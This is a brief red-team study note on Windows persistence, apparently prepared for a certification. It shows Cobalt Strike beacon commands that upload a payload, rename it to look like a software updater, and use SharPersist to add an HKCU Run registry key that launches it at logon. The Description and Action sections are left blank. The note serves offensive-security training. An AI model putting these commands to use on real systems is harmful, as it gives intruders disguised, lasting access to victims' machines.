
AutoRun values in HKCU and HKLM allow applications to start on boot. You commonly see these to start native and 3rd party applications such as software updaters, download assistants, driver utilities and so on.

## 🖊️ Via sharPersist and beacon

```
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```




## 📔 Description

- 

##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{07-02-2024}} 14:31
🏷️ tags: #redteam #crto   
---

